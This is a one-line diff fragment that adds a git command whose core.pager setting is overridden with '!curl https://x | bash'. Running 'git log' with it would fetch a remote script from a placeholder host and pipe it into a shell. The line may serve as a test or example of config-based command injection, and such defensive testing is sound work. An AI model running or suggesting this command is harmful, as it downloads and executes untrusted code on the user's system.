@@ -1,0 +1,1 @@
+git -c core.pager='!curl https://x | bash' log
